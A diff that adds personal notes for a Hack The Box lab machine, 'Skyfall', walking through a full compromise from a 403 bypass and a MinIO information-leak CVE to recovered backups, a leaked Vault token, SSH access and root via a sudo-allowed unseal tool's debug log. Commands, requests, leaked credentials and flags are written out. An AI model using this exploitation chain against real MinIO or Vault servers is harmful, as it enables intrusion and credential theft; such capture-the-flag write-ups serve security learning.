@@ -1,0 +1,274 @@
+skyfall.htb 
+
+10.10.11.254
+
+add to hosts 
+
+found demo website with guest creds
+
+demo.skyfall.htb
+guest:guest
+
+found something named miniIO
+
+found metrics
+http://demo.skyfall.htb/metrics
+403
+
+trying simple CLRF 403 bypass
+http://demo.skyfall.htb/metrics%0A
+
+bypassed 403
+
+found 
+
+minio_endpoint_url | demo.skyfall.htb |http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster
+
+adding to hosts
+
+iguess thats a vulnerablity 
+lets do a quick search
+after searching for few mins
+i found CVE-2023-28432
+
+used burpsuite intruder to post 
+
+POST /minio/bootstrap/v1/verify HTTP/1.1
+Host: prd23-s3-backend.skyfall.htb
+Upgrade-Insecure-Requests: 1
+
+
+got id passwords
+
+
+{"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
+
+
+"MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0",
+"MINIO_ROOT_PASSWORD_FILE":"secret_key",
+"MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww",
+"MINIO_ROOT_USER_FILE":"access_key",
+"MINIO_SECRET_KEY_FILE":"secret_key"
+
+install minio
+
+curl https://dl.min.io/client/mc/release/linux-amd64/mc \
+  --create-dirs \
+  -o $HOME/minio-binaries/mc
+
+chmod +x $HOME/minio-binaries/mc
+export PATH=$PATH:$HOME/minio-binaries/
+
+
+login 
+┌─[✗]─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc alias set myminio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0 
+
+list all the files in the Service using:
+
+mc ls — recursive — versions myminio
+
+after exploring got backup file
+
+─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc ls — recursive — versions myminio/askyy
+[2023-11-08 06:35:28 CET]  48KiB STANDARD Welcome.pdf
+[2023-11-09 22:37:25 CET] 2.5KiB STANDARD home_backup.tar.gz
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc cp --recursive  myminio/askyy/home_backup.tar.gz .
+...kup.tar.gz: 2.48 KiB / 2.48 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.46 KiB/s 0s
+
+
+in documentation found that we can get old versions of files in minio
+
+┌─[✗]─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc ls --recursive  --versions myminio/askyy/home_backup.tar.gz 
+[2023-11-09 22:37:25 CET] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
+[2023-11-09 22:37:09 CET] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
+[2023-11-09 22:36:30 CET] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
+ 
+1st version is way larger than older two version 
+
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc undo myminio/askyy/home_backup.tar.gz --recursive --last 3 --force
+✓ Last upload of `home_backup.tar.gz` (vid=25835695-5e73-4c13-82f7-30fd2da2cf61) is reverted.
+✓ Last upload of `home_backup.tar.gz` (vid=2b75346d-2a47-4203-ab09-3c9f878466b8) is reverted.
+✓ Last upload of `home_backup.tar.gz` (vid=3c498578-8dfe-43b7-b679-32a3fe42018f) is reverted.
+┌─[✗]─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc cp --recursive --version-id=3c498578-8dfe-43b7-b679-32a3fe42018f myminio/askyy/home_backup.tar.gz . 
+...l.htb/askyy/home_backup.tar.gz: 2.48 KiB / 2.48 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.37 KiB/s 0s
+
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $mc cp --version-id=2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz .
+...ackup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 5.29 KiB/s 0s
+
+found VAULT credentials
+
+
+export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+
+download & login via Vault
+
+wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip
+unzip vault_1.15.5_linux_amd64.zip
+export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+./vault login
+
+add to hosts and then login 
+
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $sudo nano /etc/hosts
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $./vault login
+Token (will be hidden): 
+WARNING! The VAULT_TOKEN environment variable is set! The value of this
+variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
+update its value accordingly.
+
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
+token_accessor       rByv1coOBC9ITZpzqbDtTUm8
+token_duration       435795h16m30s
+token_renewable      true
+token_policies       ["default" "developers"]
+identity_policies    []
+policies             ["default" "developers"]
+
+
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $./vault list ssh/roles
+Keys
+----
+admin_otp_key_role
+dev_otp_key_role
+
+got otp roles 
+
+login
+
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $ ./vault ssh -role dev_otp_key_role -mode otp -strict-host-key-checking=no askyy@10.10.11.254
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+askyy@skyfall:~$ 
+got user flag 
+
+askyy@skyfall:~$ ls
+user.txt
+askyy@skyfall:~$ cat user.txt 
+4b220b01cd5972e42489d292792013f3
+
+root priv escalation 
+
+askyy@skyfall:~$ sudo -l
+Matching Defaults entries for askyy on skyfall:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User askyy may run the following commands on skyfall:
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
+    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
+
+
+
+askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
+[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[-] Master token found in config: ****************************
+[>] Enable 'debug' mode for details
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[>] Check interval: 5s
+[>] Max checks: 5
+[>] Checking seal status
+[+] Vault sealed: false
+askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v -d
+[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[>] Check interval: 5s
+[>] Max checks: 5
+[>] Checking seal status
+[+] Vault sealed: false
+
+lets write debug in into a file
+
+askyy@skyfall:~$ cd sedd
+askyy@skyfall:~/sedd$ touch debug.log
+askyy@skyfall:~/sedd$  sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v -d
+[+] Reading: /etc/vault-unseal.yaml
+[-] Security Risk!
+[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
+[>] Check interval: 5s
+[>] Max checks: 5
+[>] Checking seal status
+[+] Vault sealed: false
+askyy@skyfall:~/sedd$ cat debug.log 
+2024/02/09 18:06:47 Initializing logger...
+2024/02/09 18:06:47 Reading: /etc/vault-unseal.yaml
+2024/02/09 18:06:47 Security Risk!
+2024/02/09 18:06:47 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+2024/02/09 18:06:47 Found Vault node: http://prd23-vault-internal.skyfall.htb
+2024/02/09 18:06:47 Check interval: 5s
+2024/02/09 18:06:47 Max checks: 5
+2024/02/09 18:06:47 Establishing connection to Vault...
+2024/02/09 18:06:47 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
+2024/02/09 18:06:47 Checking seal status
+2024/02/09 18:06:47 Vault sealed: false
+
+got master token 
+hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $./vault write ssh/creds/admin_otp_key_role ip=10.129.15.193 username=root
+Key                Value
+---                -----
+lease_id           ssh/creds/admin_otp_key_role/9UsmcojqGJ7zliPNPwkILQVT
+lease_duration     768h
+lease_renewable    false
+ip                 10.129.15.193
+key                77640290-04c2-4d4d-d76c-3108f862e499
+key_type           otp
+port               22
+username           root
+┌─[user@parrot]─[~/htb/skyfall.htb]
+└──╼ $./vault ssh -role admin_otp_key_role -mode otp -strict-host-key-checking=no root@10.10.11.254
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Feb  9 14:56:36 2024 from 10.10.16.47
+root@skyfall:~# 
+
+got the root flag
+root@skyfall:~# cat root.txt 
+822ed609dfd554aefbbbe8d310c82573
+
+skyfall.htb pwn3ed
+happy hacking 
